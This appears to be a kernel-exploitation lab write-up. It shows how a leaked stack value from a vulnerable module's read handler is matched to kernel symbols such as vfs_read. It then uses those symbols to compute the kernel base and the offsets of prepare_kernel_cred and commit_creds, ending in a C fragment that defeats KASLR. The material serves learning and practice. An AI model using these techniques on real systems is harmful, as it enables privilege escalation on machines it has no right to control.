## Leak of stack addresses

* Get address of `module_read`:

~~~
/ # cat /proc/kallsyms | grep module_read
ffffffffc0000069 t module_read  [vuln]
~~~

* Set bp to `module_read`:

~~~
pwndbg> b *0xffffffffc0000069
Breakpoint 1 at 0xffffffffc0000069
pwndbg> c
Continuing.
~~~

* Debug `module_read`: 

~~~
pwndbg> p $rsp
$1 = (void *) 0xffffc90000567eb0
pwndbg> x/16xg 0xffffc90000567eb0
0xffffc90000567eb0:     0xffffffff8113d33c      0x000000018114cd87
0xffffc90000567ec0:     0xffff8880026bec00      0xffff8880026bec00
0xffffc90000567ed0:     0x00007ffcc2b05c10      0x0000000000000100
0xffffc90000567ee0:     0x0000000000000000      0xffffc90000567f20
0xffffc90000567ef0:     0xffffffff8113d6e3      0x0000000000000000
0xffffc90000567f00:     0x0000000000000000      0xffffc90000567f58
0xffffc90000567f10:     0x0000000000000000      0x0000000000000000
0xffffc90000567f20:     0xffffc90000567f30      0xffffffff8113d775
~~~

* Grep addresses in `/proc/kallsyms`

No symbol is found with these exact addresses:

~~~
/ # grep ffffffff8113d33c /proc/kallsyms
/ # grep ffff8880026bec00 /proc/kallsyms
/ # grep ffffc90000567f20 /proc/kallsyms
/ # grep ffffffff8113d6e3 /proc/kallsyms
/ # grep ffffc90000567f30 /proc/kallsyms
/ # grep ffffffff8113d775 /proc/kallsyms
~~~

try grepping it by excluding the low order bits:

~~~
/ # grep ffffffff8113d /proc/kallsyms
ffffffff8113d240 T kernel_read
ffffffff8113d290 T vfs_read                    <---
ffffffff8113d410 T vfs_write
ffffffff8113d690 T ksys_read
...
/ # grep ffffffff8113d6 /proc/kallsyms
ffffffff8113d690 T ksys_read  				   <---
~~~

Taking as an example `vfs_read` and `ksys_read`, since FGKASLR is disabled, the
offset from the kernel base address to these symbols is fixed.


## Calculate offsets

* Base address

~~~
/ # head /proc/kallsyms
ffffffff81000000 T startup_64
ffffffff81000000 T _stext
ffffffff81000000 T _text
~~~

* Symbols

~~~
/ # grep prepare_kernel_cred /proc/kallsyms
ffffffff8106e240 T prepare_kernel_cred
/ # grep commit_creds /proc/kallsyms
ffffffff8106e390 T commit_creds
~~~

* Offsets

offset prepare_kernel_cred: 0xffffffff8106e240 - 0xffffffff81000000 = 0x6e240
offset commit_creds: 0xffffffff8106e390 - 0xffffffff81000000 = 0x6e390


## Exploit

~~~c
  // when no kaslr buf[0x408] = 0xffffffff8113d33c
  unsigned long addr_vfs_read = *(unsigned long*)&buf[0x408];
  unsigned long kbase = addr_vfs_read - (0xffffffff8113d33c-0xffffffff81000000);
  printf("[+] kbase = 0x%016lx\n", kbase);
~~~
